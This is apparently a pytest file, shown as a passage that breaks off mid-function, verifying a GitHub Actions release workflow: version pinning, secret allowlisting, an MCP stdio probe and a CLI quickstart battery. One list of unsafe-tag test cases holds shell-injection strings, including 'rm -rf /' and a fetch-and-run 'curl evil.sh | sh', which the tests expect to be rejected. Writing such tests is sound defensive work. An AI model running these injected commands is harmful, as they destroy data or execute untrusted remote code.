"""Offline regression tests for the tag-release verification workflow — DF-CHIMERA-0911-2.

The release-verify job in .github/workflows/ci.yml is the last gate before a
tagged release is considered good. It previously installed the UNPINNED
package (``pip install "chimera-deliberation[full]"`` — which can resolve a
newer/wrong version than the tag that triggered the run) and its MCP check
was a handshake-only ``... | head -1 | grep serverInfo`` that falsely passed
the published 0.2.3 wheel, whose lazy LiteLLM stdout pollution only begins
on a real tools/call.

These tests pin the workflow contract OFFLINE — no GitHub runner, no PyPI,
no provider keys:

* the install is exact-version pinned (``==${VERSION}``) from the tag, in a
  fresh venv, behind a BOUNDED retry that cannot fall through to another
  version, with a post-install ``chimera.__version__ == VERSION`` assertion;
* the MCP gate drives scripts/probe_mcp_stdio.py against the fresh venv's
  chimera-mcp at real tools/call depth for BOTH gate formations
  (simple + speed), and no head -1 / serverInfo handshake survives;
* the fresh-user journey (config init + real CLI run with the deterministic
  GATE-OK merged-answer assertion) is intact;
* the 0.2.3 lazy-pollution shape is replayed through the probe's real
  validators: the OLD shallow gate accepts it, the NEW gate rejects it;
* the README-documented quickstart CLI SURFACE is asserted against the
  published artifact (scripts/quickstart_battery.py) and the 0.2.5 shape —
  a wheel whose CLI rejects ``--version`` — is replayed against it (the
  battery must exit 1 and name the failing check);
* every ``secrets.*`` reference in the workflow is inside a documented
  allowlist (DF-CHIMERA-0917-5): the 0.2.6 MCP gate exported
  ``secrets.OPENROUTER_API_KEY``, which does not exist in the repository, so
  GitHub substituted it with an empty string and the step ran
  half-configured — silently, until the probe failed on an unsatisfiable
  formation;
* scripts/release_expected_version.py derives/validates the version offline;
* the installed artifact carries the two first-run fixes a tag can ship
  WITHOUT (DF-CHIMERA-V2-9 / DF-CHIMERA-V2-8): scripts/release_content_check.py
  runs against ``/tmp/release-venv`` after the pinned install and before the
  expensive live gates, drives a real MCP ``initialize`` request so the
  handshake's reported version must be the package's (not the ``mcp`` SDK's),
  and reads the installed ``chimera.config`` missing-config remedy so it must
  name ``chimera config init``. The 0.2.5-wheel shapes are replayed against it
  and must exit 1 with the failing check named;
* the ``test`` job's install reaches the tooling its unit lane imports
  (INT-GATE-003): the job installs ``.[dev,full]``, because
  ``tests/test_lsp_lint_plugins.py`` drives pylsp's lint backends and those live
  behind the dev extra — ``.[full]`` alone failed every matrix version with
  ``ModuleNotFoundError: No module named 'pylsp'`` (CI 35355829236).
"""

from __future__ import annotations

import importlib.util
import json
import re
import shlex
import subprocess
import sys
import tomllib
from collections.abc import Callable
from pathlib import Path
from types import ModuleType

import pytest
import yaml
from packaging.requirements import Requirement

REPO = Path(__file__).resolve().parent.parent
WORKFLOW_PATH = REPO / ".github" / "workflows" / "ci.yml"
PROBE_PATH = REPO / "scripts" / "probe_mcp_stdio.py"
VERSION_SCRIPT_PATH = REPO / "scripts" / "release_expected_version.py"
QUICKSTART_PATH = REPO / "scripts" / "quickstart_battery.py"
RELEASE_CONTENT_PATH = REPO / "scripts" / "release_content_check.py"


def _load_workflow(path: Path = WORKFLOW_PATH) -> dict:
    """Parse a workflow file (by default the real ci.yml) as a mapping.

    ``path`` is a parameter so the mutation tests can assert against a mutated
    COPY without ever editing the tracked workflow.
    """
    with path.open(encoding="utf-8") as fh:
        doc = yaml.safe_load(fh)
    assert isinstance(doc, dict), f"{path} must parse as a mapping"
    return doc


def _load_module(name: str, path: Path) -> ModuleType:
    """Load a script as a module (scripts/ is not a package)."""
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


probe = _load_module("probe_mcp_stdio", PROBE_PATH)
release_version = _load_module("release_expected_version", VERSION_SCRIPT_PATH)
quickstart = _load_module("quickstart_battery", QUICKSTART_PATH)
release_content = _load_module("release_content_check", RELEASE_CONTENT_PATH)


@pytest.fixture(scope="module")
def workflow() -> dict:
    return _load_workflow()


@pytest.fixture(scope="module")
def release_verify_steps(workflow: dict) -> list[dict]:
    job = workflow["jobs"]["release-verify"]
    assert job["needs"] == "publish", "release-verify must run only after publish"
    assert "refs/tags/v" in job["if"], "release-verify must be tag-triggered"
    return job["steps"]


@pytest.fixture(scope="module")
def release_verify_run_blocks(release_verify_steps: list[dict]) -> str:
    """All run blocks of release-verify, concatenated for contract greps."""
    return "\n".join(step.get("run", "") for step in release_verify_steps)


# --- exact-version pinning -------------------------------------------------- #


def test_install_is_exact_version_pinned(release_verify_run_blocks: str) -> None:
    """The published artifact is installed as ==$VERSION, never unpinned."""
    assert 'chimera-deliberation[full]==${VERSION}' in release_verify_run_blocks
    # No bare/unpinned install of the package may survive anywhere in the job.
    unpinned = re.findall(r'pip install\s+"chimera-deliberation\[full\]"', release_verify_run_blocks)
    assert not unpinned, f"unpinned install survived: {unpinned}"


def test_version_derived_from_tag_via_validating_script(release_verify_run_blocks: str) -> None:
    """VERSION comes from the tag through the validating helper, not raw ref."""
    derive = 'VERSION=$(python scripts/release_expected_version.py "${GITHUB_REF_NAME}")'
    assert derive in release_verify_run_blocks
    assert 'echo "VERSION=${VERSION}" >> "$GITHUB_ENV"' in release_verify_run_blocks


def test_post_install_asserts_imported_version_equals_tag(release_verify_run_blocks: str) -> None:
    """Belt-and-braces: the imported package version must BE the tag version."""
    assert "chimera.__version__" in release_verify_run_blocks
    assert "== '${VERSION}'" in release_verify_run_blocks


# --- bounded publish-availability retry -------------------------------------- #


def test_install_retry_is_bounded_and_cannot_fall_through(release_verify_run_blocks: str) -> None:
    """Retry loop is finite, sleeps between attempts, and fails loudly."""
    match = re.search(r"for attempt in \$\(seq 1 (\d+)\)", release_verify_run_blocks)
    assert match, "install step must retry via a bounded seq loop"
    attempts = int(match.group(1))
    assert 1 < attempts <= 40, f"retry bound {attempts} must be finite and sane"
    assert re.search(r"sleep \d+", release_verify_run_blocks), "retry loop must sleep between attempts"
    # After the loop, an unmet install is a hard failure — never a silent pass.
    assert "never became installable" in release_verify_run_blocks
    assert "exit 1" in release_verify_run_blocks
    # The pinned requirement appears INSIDE the loop (every attempt exact).
    loop = release_verify_run_blocks[match.start() :]
    loop = loop[: loop.index("done")]
    assert 'chimera-deliberation[full]==${VERSION}' in loop


# --- deep MCP probe invocation ----------------------------------------------- #


def test_mcp_gate_uses_deep_probe_against_fresh_venv(release_verify_run_blocks: str) -> None:
    """The MCP gate runs the real-depth probe on the installed artifact."""
    assert "python scripts/probe_mcp_stdio.py" in release_verify_run_blocks
    assert "/tmp/release-venv/bin/chimera-mcp" in release_verify_run_blocks


def test_mcp_gate_probes_both_gate_formations(release_verify_run_blocks: str) -> None:
    """The 0.2.3 leak was formation-dependent — simple AND speed are probed."""
    mcp_bin = "/tmp/release-venv/bin/chimera-mcp"
    simple = re.search(rf"probe_mcp_stdio\.py --formation=simple {mcp_bin}", release_verify_run_blocks)
    speed = re.search(rf"probe_mcp_stdio\.py --formation=speed {mcp_bin}", release_verify_run_blocks)
    assert simple, "probe must run with --formation=simple"
    assert speed, "probe must run with --formation=speed (the 0.2.3 leaky leg)"


def test_no_shallow_handshake_survives(release_verify_run_blocks: str) -> None:
    """The falsely-green 0.2.3-era handshake check must be gone."""
    assert "head -1" not in release_verify_run_blocks
    assert "serverInfo" not in release_verify_run_blocks


def test_mcp_gate_carries_provider_keys(release_verify_steps: list[dict]) -> None:
    """A real tools/call needs a provider key in the step env."""
    probe_steps = [s for s in release_verify_steps if "probe_mcp_stdio" in s.get("run", "")]
    assert probe_steps, "no probe step found"
    env = probe_steps[0].get("env", {})
    assert "DEEPSEEK_API_KEY" in env


# --- secret allowlist (DF-CHIMERA-0917-5) ------------------------------------ #
#
# CI run 35224141038 (tag v0.2.6): the release-verify MCP gate exported
# ``OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}`` — a secret that does
# NOT exist in this repository (``gh secret list`` returns exactly
# DEEPSEEK_API_KEY and PYPI_TOKEN). GitHub substitutes a missing secret as an
# EMPTY string with no warning, so the step looked configured while the probe
# drove a formation whose OpenRouter worker could never be satisfied. Two guards
# here: the allowlist pins what the workflow may reference, and the probe step
# must exercise the probe's own config provisioning (no --config/--cwd), which
# is what makes the gate independent of the untracked repo-root chimera.yaml.

#: Secrets that exist on the repo. ADDING A REFERENCE REQUIRES CREATING THE
#: SECRET IN THE REPOSITORY FIRST (Settings → Secrets → Actions), then extending
#: this set deliberately — a typo'd/dangling ``secrets.X`` is silently empty.
ALLOWED_SECRETS = {"DEEPSEEK_API_KEY", "PYPI_TOKEN"}


def test_every_secret_reference_is_in_the_documented_allowlist() -> None:
    """No ``secrets.*`` reference outside the allowlist (recurrence guard)."""
    text = WORKFLOW_PATH.read_text(encoding="utf-8")
    used = set(re.findall(r"secrets\.([A-Za-z0-9_]+)", text))
    assert used, "no secrets.* reference found — the workflow changed shape"
    unknown = used - ALLOWED_SECRETS
    assert not unknown, (
        f"ci.yml references secret(s) that do not exist in the repository: {sorted(unknown)}. "
        f"GitHub substitutes a missing secret as an empty string, so the step would run "
        f"half-configured; create the secret first, then add it to ALLOWED_SECRETS."
    )


def test_mcp_probe_step_does_not_depend_on_a_nonexistent_secret() -> None:
    """The exact defect: the probe step must not export OPENROUTER_API_KEY."""
    step = next(
        s for s in _release_verify_job_steps() if "probe_mcp_stdio" in s.get("run", "")
    )
    env = step.get("env") or {}
    assert "OPENROUTER_API_KEY" not in env, (
        "the repo has no OPENROUTER_API_KEY secret; the probe remaps uncredentialed "
        "models onto DEEPSEEK_API_KEY instead (printing each substitution)"
    )
    assert set(env) <= ALLOWED_SECRETS, f"unexpected probe-step env: {sorted(env)}"


def test_mcp_probe_step_exercises_the_self_provisioning_default() -> None:
    """No --config/--cwd in the gate: the provisioned-config path is what CI runs.

    Passing a path would test the operator path instead of the default one that
    a fresh checkout (no untracked chimera.yaml) actually takes.
    """
    step = next(
        s for s in _release_verify_job_steps() if "probe_mcp_stdio" in s.get("run", "")
    )
    run = step["run"]
    assert "--config=" not in run and "--cwd=" not in run
    assert "provisions its OWN config" in run, (
        "the step must document that it no longer depends on the repo-root chimera.yaml"
    )


def _release_verify_job_steps() -> list[dict]:
    with WORKFLOW_PATH.open(encoding="utf-8") as fh:
        doc = yaml.safe_load(fh)
    return doc["jobs"]["release-verify"]["steps"]


# --- fresh-user journey ------------------------------------------------------- #


def test_fresh_user_journey_is_intact(release_verify_run_blocks: str) -> None:
    """config init + a real CLI deliberation with a deterministic assertion."""
    assert "/tmp/release-venv/bin/chimera config init" in release_verify_run_blocks
    assert "test -f chimera.yaml" in release_verify_run_blocks
    assert '/tmp/release-venv/bin/chimera run "Reply with exactly: GATE-OK"' in release_verify_run_blocks
    assert 'grep -q "GATE-OK" /tmp/gate_run.out' in release_verify_run_blocks


# --- 0.2.3 lazy-pollution replay ---------------------------------------------- #

_INIT_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "protocolVersion": "2025-03-26",
            "capabilities": {"tools": {}},
            "serverInfo": {"name": "chimera-mcp", "version": "0.2.3"},
        },
    }
)
_TOOLS_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 2,
        "result": {
            "tools": [
                {"name": "chimera_deliberate"},
                {"name": "chimera_formations"},
                {"name": "chimera_models"},
            ]
        },
    }
)
_DEPTH_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 3,
        "result": {"content": [{"type": "text", "text": json.dumps({"answer": "17 * 23 = 391"})}]},
    }
)
#: The banner LiteLLM printed to stdout on the OpenRouter leg in the 0.2.3
#: wheel — AFTER a clean handshake, only once a real deliberation ran.
_LITELLM_BANNER = "\x1b[1;36mProvider List: https://docs.litellm.ai/docs/providers\x1b[0m"


def _old_shallow_gate_passes(stdout_lines: list[str]) -> bool:
    """Replay the 0.2.3-era check: first stdout line greps serverInfo."""
    return bool(stdout_lines) and '"serverInfo"' in stdout_lines[0]


def test_023_shape_fools_the_old_gate_but_fails_the_new_one() -> None:
    """The known 0.2.3 lazy-pollution shape: handshake pure, depth polluted.

    The old initialize-only gate ACCEPTS this transcript; the probe's real
    validators REJECT it — this is the failure signal the release canary
    must produce on any lazy stdout pollution.
    """
    polluted_at_depth = [_INIT_RESPONSE, _TOOLS_RESPONSE, _LITELLM_BANNER, _DEPTH_RESPONSE]

    assert _old_shallow_gate_passes(polluted_at_depth), (
        "premise broken: the old head -1 | grep serverInfo gate should ACCEPT this 0.2.3 transcript"
    )

    order, responses = probe.collect_responses(polluted_at_depth)
    problems = probe.check_handshake(polluted_at_depth, order, responses)
    depth_problems, _ = probe.check_depth_result(responses.get(3, {}).get("result", {}))
    problems.extend(depth_problems)
    assert problems, "the deep probe must REJECT the 0.2.3 lazy-pollution transcript"
    assert any("non-JSON-RPC stdout lines" in p for p in problems), (
        f"expected a stdout-pollution finding, got: {problems}"
    )


def test_probe_clean_transcript_passes_both_validators() -> None:
    """Control: a pure transcript (what a fixed wheel emits) passes cleanly."""
    clean = [_INIT_RESPONSE, _TOOLS_RESPONSE, _DEPTH_RESPONSE]
    assert _old_shallow_gate_passes(clean)
    order, responses = probe.collect_responses(clean)
    problems = probe.check_handshake(clean, order, responses)
    depth_problems, _ = probe.check_depth_result(responses.get(3, {}).get("result", {}))
    problems.extend(depth_problems)
    assert problems == [], f"clean transcript must pass, got: {problems}"


# --- release_expected_version.py contract ------------------------------------- #


def test_derive_version_strips_v_and_validates() -> None:
    assert release_version.derive_version("v0.2.5") == "0.2.5"
    assert release_version.derive_version("v1.0.0rc1") == "1.0.0rc1"


@pytest.mark.parametrize(
    "bad_tag",
    [
        "0.2.5",  # missing v prefix
        "v",  # empty version
        "v0.2.5; rm -rf /",  # shell injection
        'v0.2.5" && curl evil.sh | sh #',  # quote breakout
        "v0.2.5 || true",  # command chaining
        "vlatest",  # not a version
        "v0.2.5+local",  # local segment not accepted
        "",  # empty tag
    ],
)
def test_derive_version_rejects_unsafe_tags(bad_tag: str) -> None:
    with pytest.raises(ValueError):
        release_version.derive_version(bad_tag)


def test_expected_version_matches_this_repo_pyproject() -> None:
    """The tag built from pyproject's own version must round-trip."""
    declared = release_version.pyproject_version(REPO / "pyproject.toml")
    assert release_version.is_safe_pep440(declared)
    assert release_version.expected_version(f"v{declared}") == declared


def test_expected_version_rejects_tag_pyproject_mismatch(tmp_path: Path) -> None:
    """A tag that doesn't match the declared version is a hard failure."""
    fake = tmp_path / "pyproject.toml"
    fake.write_text('[project]\nname = "chimera-deliberation"\nversion = "9.9.9"\n', encoding="utf-8")
    declared = release_version.pyproject_version(REPO / "pyproject.toml")
    with pytest.raises(ValueError, match="does not match|declares"):
        release_version.expected_version(f"v{declared}", fake)


# --- README quickstart CLI surface vs the published artifact (DF-CHIMERA-0916B-3) -- #

#: Offline stand-in for an installed ``chimera`` console script. Both
#: ``bin/chimera`` and ``bin/python`` get this body, because the battery drives
#: the console script directly AND the interpreter as ``python -m chimera``.
_FAKE_CLI_TEMPLATE = '''#!/usr/bin/env python3
"""Offline stand-in for the installed chimera console script (test fixture)."""
import sys

VERSION = __VERSION__
ACCEPTS_VERSION = __ACCEPTS_VERSION__
ARGS = sys.argv[1:]

if "--version" in ARGS:
    if not ACCEPTS_VERSION:
        print("Usage: chimera [OPTIONS] [COMMAND] [ARGS]...", file=sys.stderr)
        print(
            "Error: No such option '--version'. (Did you mean one of: "
            "'--formation', '--verbose'?)",
            file=sys.stderr,
        )
        raise SystemExit(2)
    print("chimera " + VERSION)
    raise SystemExit(0)
if "--help" in ARGS:
    print("Usage: chimera [OPTIONS] [COMMAND] [ARGS]...")
    raise SystemExit(0)
if ARGS[:2] == ["config", "init"]:
    with open("chimera.yaml", "w", encoding="utf-8") as fh:
        fh.write("server: {}\\n")
    print("Created chimera.yaml")
    raise SystemExit(0)
print("unexpected args: %r" % (ARGS,), file=sys.stderr)
raise SystemExit(9)
'''


def _make_fake_venv(
    tmp_path: Path, *, accepts_version: bool = True, version: str = "0.2.5"
) -> Path:
    """A venv-shaped directory whose CLI entry points are the offline stand-in."""
    venv = tmp_path / "fake-venv"
    (venv / "bin").mkdir(parents=True, exist_ok=True)
    body = _FAKE_CLI_TEMPLATE.replace("__VERSION__", repr(version)).replace(
        "__ACCEPTS_VERSION__", repr(accepts_version)
    )
    for name in ("chimera", "python"):
        entry = venv / "bin" / name
        entry.write_text(body, encoding="utf-8")
        entry.chmod(0o755)
    return venv


def _run_battery(*args: str) -> subprocess.CompletedProcess:
    """Run the battery as a real process — its exit codes ARE the contract."""
    return subprocess.run(
        [sys.executable, str(QUICKSTART_PATH), *args],
        capture_output=True,
        text=True,
        cwd=REPO,
        timeout=120,
    )


def test_battery_wired_into_release_verify_after_the_pinned_install(
    release_verify_steps: list[dict],
) -> None:
    """The battery runs against the pinned published venv with the tag version."""
    indices = [
        i for i, step in enumerate(release_verify_steps) if "quickstart_battery.py" in step.get("run", "")
    ]
    assert len(indices) == 1, f"expected exactly one quickstart-battery step, found {indices}"
    step_index = indices[0]
    command_line = next(
        line.strip()
        for line in release_verify_steps[step_index]["run"].splitlines()
        if "quickstart_battery.py" in line
    )
    assert shlex.split(command_line) == [
        "python",
        "scripts/quickstart_battery.py",
        "--venv",
        "/tmp/release-venv",
        "--expected-version",
        "${VERSION}",
    ], f"battery must target the pinned release venv + tag-derived version, got {command_line!r}"

    install_index = next(
        i
        for i, step in enumerate(release_verify_steps)
        if "chimera-deliberation[full]==${VERSION}" in step.get("run", "")
    )
    e2e_index = next(
        i for i, step in enumerate(release_verify_steps) if "GATE-OK" in step.get("run", "")
    )
    assert install_index < step_index < e2e_index, (
        "the surface battery must run AFTER the pinned install and BEFORE the "
        f"E2E run (install={install_index}, battery={step_index}, e2e={e2e_index})"
    )


def test_battery_step_needs_no_provider_keys(release_verify_steps: list[dict]) -> None:
    """Every battery check is local, so its step must not carry secrets/keys."""
    step = next(s for s in release_verify_steps if "quickstart_battery.py" in s.get("run", ""))
    assert not step.get("env"), f"quickstart battery must be keyless, got env={step.get('env')}"


def test_battery_rejects_the_shipped_0_2_5_cli_surface(tmp_path: Path) -> None:
    """RED shape of the 0.2.5 wheel: the CLI rejects ``--version``.

    The published 0.2.5 wheel exits 2 with "Error: No such option '--version'."
    for BOTH documented forms while ``--help`` and ``config init`` still work —
    the battery must therefore fail, exit 1, and NAME the failing checks.
    """
    venv = _make_fake_venv(tmp_path, accepts_version=False)
    proc = _run_battery("--venv", str(venv), "--expected-version", "0.2.5")
    assert proc.returncode == 1, (
        f"a CLI without --version must fail the battery, got {proc.returncode}\n"
        f"stdout:\n{proc.stdout}\nstderr:\n{proc.stderr}"
    )
    assert "[FAIL] cli-version" in proc.stdout, proc.stdout
    assert "[FAIL] module-version" in proc.stdout, proc.stdout
    assert "No such option" in proc.stdout, proc.stdout
    assert "QUICKSTART BATTERY FAIL" in proc.stdout
    # The two checks the shipped 0.2.5 wheel DID pass stay reported as passing.
    assert "[PASS] cli-help" in proc.stdout
    assert "[PASS] config-init" in proc.stdout


def test_battery_passes_on_a_conforming_cli(tmp_path: Path) -> None:
    """GREEN control: the documented surface works -> exit 0, 4/4 checks."""
    venv = _make_fake_venv(tmp_path)
    proc = _run_battery("--venv", str(venv), "--expected-version", "0.2.5")
    assert proc.returncode == 0, f"conforming CLI must pass\n{proc.stdout}\n{proc.stderr}"
    assert "CHECKS_PASSED=4 CHECKS_FAILED=0" in proc.stdout
    assert "QUICKSTART BATTERY OK" in proc.stdout
    assert "created chimera.yaml" in proc.stdout


def test_battery_rejects_a_cli_reporting_another_version(tmp_path: Path) -> None:
    """Accepting ``--version`` is not enough: the version must BE the expected one."""
    venv = _make_fake_venv(tmp_path, version="0.2.4")
    proc = _run_battery("--venv", str(venv), "--expected-version", "0.2.5")
    assert proc.returncode == 1, f"wrong version must fail the battery\n{proc.stdout}"
    assert "[FAIL] cli-version" in proc.stdout
    assert "output lacks version '0.2.5'" in proc.stdout


@pytest.mark.parametrize(
    "args",
    [
        (),  # --expected-version is required
        ("--venv", "/tmp"),  # venv given, version missing
        ("--expected-version", ""),  # blank value
        ("--expected-version", "0.2.5", "--bogus"),  # unknown option
        ("--expected-version", "0.2.5", "--venv"),  # missing option value
        ("--expected-version", "0.2.5", "--venv", "/nonexistent-venv-0916b3"),  # not a dir
        ("--expected-version", "0.2.5", "positional"),  # unexpected positional
    ],
)
def test_battery_usage_errors_exit_2(args: tuple[str, ...]) -> None:
    """Documented exit contract: bad input is 2 — never 1 and never a traceback."""
    proc = _run_battery(*args)
    assert proc.returncode == 2, (
        f"expected usage exit 2 for {args}, got {proc.returncode}\n{proc.stdout}\n{proc.stderr}"
    )
    assert "usage error" in proc.stderr, proc.stderr
    assert "Traceback" not in proc.stderr, proc.stderr


def test_battery_check_inventory_follows_the_readme(tmp_path: Path) -> None:
    """The four README quickstart assertions, in documented order."""
    checks = quickstart.build_checks(tmp_path)
    assert [c.name for c in checks] == ["cli-version", "module-version", "cli-help", "config-init"]
    assert checks[0].version_expected and checks[1].version_expected
    assert not checks[2].version_expected
    assert checks[3].expect_file == "chimera.yaml"


def test_battery_runs_every_check_in_a_fresh_temp_cwd(tmp_path: Path) -> None:
    """No quickstart command may run in the caller's cwd (never the repo root)."""
    probe = tmp_path / "print_cwd.py"
    probe.write_text(
        "import os, sys\nwith open(sys.argv[1], 'w', encoding='utf-8') as fh:\n    fh.write(os.getcwd())\n",
        encoding="utf-8",
    )
    recorded_path = tmp_path / "cwd.txt"
    check = quickstart.Check(
        "cwd-probe", [sys.executable, str(probe), str(recorded_path)], "records the child cwd"
    )
    result = quickstart.run_check(check, "0.2.5")
    assert result.ok, result.detail
    recorded = recorded_path.read_text(encoding="utf-8")
    assert recorded != str(REPO), "the battery ran a check in the repo root"
    assert Path(recorded).name.startswith("chimera-quickstart-"), recorded
    assert not Path(recorded).exists(), "the temp cwd must be cleaned up"


def test_battery_version_token_match_is_boundary_anchored() -> None:
    """``0.2.5`` must not be satisfied by 0.2.50 / 0.2.5rc1 / 10.2.5."""
    assert quickstart.version_token_present("chimera 0.2.5\n", "0.2.5")
    assert quickstart.version_token_present("chimera 0.2.5 (python 3.11)", "0.2.5")
    assert not quickstart.version_token_present("chimera 0.2.50\n", "0.2.5")
    assert not quickstart.version_token_present("chimera 0.2.5rc1\n", "0.2.5")
    assert not quickstart.version_token_present("chimera 10.2.5\n", "0.2.5")


# --- README quickstart CLI surface on ordinary pushes (DF-CHIMERA-0917-4) ----- #
#
# scripts/quickstart_battery.py originally ran in exactly ONE place: the
# release-verify job, which is gated `if: github.event_name == 'push' &&
# startsWith(github.ref, 'refs/tags/v')`. Between release cuts nothing asserted the
# CLI surface the README's Quickstart block documents, so a tree whose CLI had
# drifted from its own README (a documented flag renamed or removed, a broken
# console script, `config init` regressing) stayed invisible until a tag was cut —
# recurrence #4 of the repo-HEAD-vs-published-artifact class. These tests pin the
# battery into the `test` job (which runs for push AND pull_request on every
# supported version) with the expected version derived from pyproject.toml at that
# commit: never hardcoded, never read back from the artifact under test.

#: The push-lane invocation, pinned exactly: the repo's own .venv interpreter, the
#: editable-install venv, and the in-step derived version (``${VERSION}``).
PUSH_BATTERY_COMMAND = [
    ".venv/bin/python",
    "scripts/quickstart_battery.py",
    "--venv",
    ".venv",
    "--expected-version",
    "${VERSION}",
]


def _quickstart_battery_steps(job: dict) -> list[dict]:
    """The job's steps that invoke the README quickstart battery."""
    return [step for step in job["steps"] if "quickstart_battery.py" in step.get("run", "")]


def _assert_test_job_runs_quickstart_battery(job: dict) -> dict:
    """Assert the `test`-job battery contract, and return the step it pinned.

    The whole contract lives in this one helper so the mutation tests below judge
    a mutated COPY by exactly the assertions the real workflow passes.
    """
    assert "refs/tags" not in (job.get("if") or ""), (
        "the `test` job must keep running on ordinary pushes/pull_requests — "
        "a tag gate would put the battery back behind release cuts"
    )
    battery_steps = _quickstart_battery_steps(job)
    assert len(battery_steps) == 1, (
        f"the `test` job must declare exactly one quickstart-battery step, found {len(battery_steps)}"
    )
    step = battery_steps[0]
    run = step["run"]

    invocations = [line.strip() for line in run.splitlines() if "quickstart_battery.py" in line]
    assert len(invocations) == 1, f"expected exactly one battery invocation, got {invocations}"
    command = shlex.split(invocations[0])
    assert command == PUSH_BATTERY_COMMAND, (
        "the push-lane battery must run on the editable .venv with the pyproject-derived "
        f"version, got {command}"
    )

    derivations = [line.strip() for line in run.splitlines() if line.strip().startswith("VERSION=$(")]
    assert len(derivations) == 1, (
        f"the expected version must come from exactly one VERSION=$(...) derivation, got {derivations}"
    )
    derivation = derivations[0]
    assert "tomllib.loads(" in derivation and "pyproject.toml" in derivation, (
        "the expected version must be derived from pyproject.toml with a stdlib-only one-liner "
        f"(tomllib ships with Python 3.11+, so every matrix version can run it), got {derivation!r}"
    )
    assert re.search(r"\[['\"]project['\"]\]\[['\"]version['\"]\]", derivation), (
        f"the derivation must read [project].version, got {derivation!r}"
    )
    assert "import chimera" not in run and "chimera.__version__" not in run, (
        "the expected version must never be read back from the artifact under test — "
        "that would compare the artifact against itself"
    )

    declared = release_version.pyproject_version(REPO / "pyproject.toml")
    assert declared not in run, (
        f"the step hardcodes this repo's version ({declared}); derive it from pyproject.toml "
        "instead, or the check silently follows the artifact instead of the source"
    )
    literals = re.findall(r"\d+\.\d+\.\d+", run)
    assert not literals, f"no literal version string may appear in the step, found {literals}"

    assert not re.search(r"(?<![/\w.-])python\b", run), (
        "the step must invoke the repo's own .venv interpreter; a bare `python` is a different "
        "install than the .venv the battery asserts against"
    )
    assert "secrets." not in yaml.safe_dump(step), f"the battery is keyless, got {step}"
    assert not step.get("env"), f"the battery is keyless, got env={step.get('env')}"

    steps = job["steps"]
    battery_index = steps.index(step)
    install_step = _assert_test_job_installs_the_dev_extras(job)
    install_index = steps.index(install_step)
    assert install_index < battery_index, (
        f"the battery needs the editable install ({install_index}) to precede it ({battery_index})"
    )
    unit_test_index = next(i for i, s in enumerate(steps) if "-m pytest tests/" in s.get("run", ""))
    assert unit_test_index < battery_index, (
        f"the battery step belongs after the unit tests ({unit_test_index}), got {battery_index}"
    )
    return step


def test_test_job_runs_the_readme_quickstart_battery(workflow: dict) -> None:
    """The `test` job asserts the CLI surface the README documents."""
    step = _assert_test_job_runs_quickstart_battery(workflow["jobs"]["test"])
    assert "DF-CHIMERA-0917-4" in step["name"]


def test_push_battery_step_is_distinguishable_from_the_release_one(workflow: dict) -> None:
    """A human reading CI output can tell which artifact each battery judged."""
    push_step = _quickstart_battery_steps(workflow["jobs"]["test"])[0]
    release_step = _quickstart_battery_steps(workflow["jobs"]["release-verify"])[0]
    assert push_step["name"] != release_step["name"]
    assert "editable" in push_step["name"].lower(), push_step["name"]
    assert "/tmp/release-venv" not in push_step["run"]
    assert "/tmp/release-venv" in release_step["run"]


def test_both_battery_lanes_survive(workflow: dict) -> None:
    """The push lane is ADDITIVE: the tag-gated release gate must stay intact."""
    assert len(_quickstart_battery_steps(workflow["jobs"]["test"])) == 1
    assert len(_quickstart_battery_steps(workflow["jobs"]["release-verify"])) == 1


def test_quickstart_battery_job_runs_on_push_and_pull_request(workflow: dict) -> None:
    """`test` — the job that now carries the battery — is not tag-gated."""
    triggers = workflow.get("on", workflow.get(True))
    assert isinstance(triggers, dict), f"unexpected triggers shape: {triggers!r}"
    assert "push" in triggers and "pull_request" in triggers, sorted(triggers)
    assert "if" not in workflow["jobs"]["test"], "the `test` job must have no job-level gate"


def test_push_battery_step_is_keyless_and_network_free(workflow: dict) -> None:
    """Every battery check is local (click argv parsing plus a file copy)."""
    step = _quickstart_battery_steps(workflow["jobs"]["test"])[0]
    assert not step.get("env"), f"no env may be set, got {step.get('env')}"
    assert "secrets." not in yaml.safe_dump(step)
    run = step["run"]
    assert "curl" not in run and "pip install" not in run, run


def _mutate_test_job_battery_step(doc: dict, mutate: Callable[[dict], None]) -> None:
    """Mutate the (single) quickstart-battery step of the `test` job in place."""
    steps = _quickstart_battery_steps(doc["jobs"]["test"])
    assert len(steps) == 1, f"premise broken: expected one battery step, found {len(steps)}"
    mutate(steps[0])


def _write_workflow_copy(tmp_path: Path, doc: dict) -> Path:
    """Serialize a mutated workflow to tmp_path — the real ci.yml is never edited."""
    out = tmp_path / "ci-mutated.yml"
    out.write_text(yaml.safe_dump(doc, sort_keys=False), encoding="utf-8")
    return out


def _assert_mutated_copy_fails(
    tmp_path: Path, mutate: Callable[[dict], None], match: str
) -> None:
    """A mutated COPY of ci.yml must FAIL the contract (the real file is untouched)."""
    doc = _load_workflow()
    _mutate_test_job_battery_step(doc, mutate)
    mutated = _load_workflow(_write_workflow_copy(tmp_path, doc))
    with pytest.raises(AssertionError, match=re.escape(match)):
        _assert_test_job_runs_quickstart_battery(mutated["jobs"]["test"])


def test_step_removed_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: drop the step from the `test` job -> the assertions must FAIL."""
    doc = _load_workflow()
    job = doc["jobs"]["test"]
    before = len(_quickstart_battery_steps(job))
    job["steps"] = [s for s in job["steps"] if "quickstart_battery.py" not in s.get("run", "")]
    after = len(_quickstart_battery_steps(job))
    assert (before, after) == (1, 0), f"premise broken: battery steps {before} -> {after}"
    mutated = _load_workflow(_write_workflow_copy(tmp_path, doc))
    with pytest.raises(AssertionError, match="exactly one quickstart-battery step"):
        _assert_test_job_runs_quickstart_battery(mutated["jobs"]["test"])


def test_expected_version_removed_fails_the_pin(tmp_path: Path) -> None:
    """NEGATIVE: drop ``--expected-version`` -> the battery would only compare
    the artifact against itself, so the pin must FAIL."""

    def strip_expected_version(step: dict) -> None:
        assert '--expected-version "${VERSION}"' in step["run"], (
            "premise broken: the invocation changed shape"
        )
        step["run"] = step["run"].replace('--expected-version "${VERSION}"', "")
        assert "--expected-version" not in step["run"]

    _assert_mutated_copy_fails(
